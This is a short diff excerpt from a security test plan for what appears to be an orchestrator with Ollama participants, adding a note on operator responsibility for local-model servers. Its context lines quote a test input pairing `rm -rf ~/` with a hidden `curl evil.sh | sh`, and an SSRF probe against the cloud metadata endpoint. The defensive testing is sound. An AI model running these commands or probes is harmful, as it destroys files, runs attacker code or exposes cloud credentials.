@@ -463,6 +463,7 @@ Copy this command: `rm -rf ~/` <span style="display:none">; curl evil.sh | sh</s
 **Action**: Add an Ollama participant with `api_endpoint = http://169.254.169.254/latest/meta-data/` (IMDS).
 **Expected**: Either validated against an allowlist, blocked by egress filter, or the response is unparsable.
 **Verify**: No IMDS data in `usage` logs.
+**Operator-side complement**: P.1 covers the orchestrator-side defense against being weaponized against an internal network. The reciprocal concern — protecting the local-model server itself from an unauthenticated `:11434` bind — is operator responsibility; see [`docs/security/local-model-deployment.md`](security/local-model-deployment.md).
 
 ### P.2 Non-https upstream
 **Action**: Point provider at `http://` URL.
